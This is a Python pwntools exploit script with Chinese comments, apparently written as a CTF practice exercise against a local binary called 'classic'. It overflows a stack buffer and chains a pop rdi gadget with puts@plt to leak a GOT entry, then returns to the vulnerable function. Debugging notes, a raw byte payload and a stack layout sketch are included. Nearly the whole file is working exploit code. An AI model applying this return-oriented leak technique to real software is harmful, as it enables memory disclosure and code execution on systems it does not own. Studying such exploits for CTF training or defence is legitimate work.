# encoding:utf-8
from pwn import *
# 一次执行是对的，但是后面会出现\n问题  0x0a

# elf = ELF('./classic')
# # 输出函数
# puts_plt = elf.symbols['puts']
# print "%#x" % puts_plt # 0x40051c
# # 输入函数
# gets_plt = elf.symbols['gets']
# GDB 调试看到的 put@plt 位置  也可以用 IDA 找到 call puts@plt 即可
puts_plt = 0x400520 

# 漏洞函数的地址
# https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.8_dynelf.html
vuln_addr = 0x4006A9 # 这里填写漏洞函数里面汇编第一个地址

poprdi_ret = 0x400753 # pop rdi ; ret

def genX(string):
    r = ""
    for i in range(len(string)):
        hex_char = (ord(string[i])).__hex__()
        if len(hex_char) < 4:
            hex_char = hex_char.replace("0x", "0x0")
        r += hex_char + " "
        if (i%16) == 0:
            r += ""
    r = r.replace("0x", "\\x")
    r = r.replace(" ", "")
    print r

p = process('./classic', env = {'LD_PRELOAD': './libc-2.23.so'})
# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
# gdb.attach(proc.pidof(p)[0])

address = 0x4006A9 # 需要泄露的地址
address = 0x601018
payload1 = 'a'*(48+24)+ p64(poprdi_ret) + p64(address) + p64(puts_plt) + p64(vuln_addr)
genX(payload1)
p.sendline(payload1) # 自动添加\n
print p.recvuntil('Have a nice pwn!!\n')

s = p.recvuntil("\n")
data = s[:8]
print "%#x => %s" % (address, (data or '').encode('hex'))
print "-------------------Two"
p.sendline(payload1) # 自动添加\n
print p.recvuntil('Have a nice pwn!!\n')

s = p.recvuntil("\n")
data = s[:8]
print "%#x => %s" % (address, (data or '').encode('hex'))
p.interactive()

# 泄露的是0x4006a9 => 436c617373696320 Classic
# 想办法 pwndbg 调试
# http://brieflyx.me/2015/python-module/pwntools-advanced/ 
# 0xdeadbeef is not non-printable. It is what is commonly known as hexspeak
# r <<< $(python -c"print '\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x53\x07\x40\x00\x00\x00\x00\x00\xa9\x06\x40\x00\x00\x00\x00\x00\x1c\x05\x40\x00\x00\x00\x00\x00\xa9\x06\x40\x00\x00\x00\x00\x00'")
# 好像是 print 不会打印 \x00
# 写入文件  r < input
# set *((long int *)0x7fffffffdd30) = 0x400520  # 直接在gdb 查看 0x400区域plt值
# 我的栈布局：
# 0x7fffffffdd20 p64(poprdi_ret)
# 0x7fffffffdd28 p64(address)
# 0x7fffffffdd30 p64(puts_plt) 
# 0x7fffffffdd38 p64(vuln_addr) <= leave 过后 ret对准这条指令
# leave 汇编做了什么？
"""
在32位汇编下相当于:
mov esp,ebp  #这一步会导致所有的堆栈瞬间平衡！，所有你需要调试找到具体的溢出字符长度为多少！（关键定位EIP）
pop ebp
"""
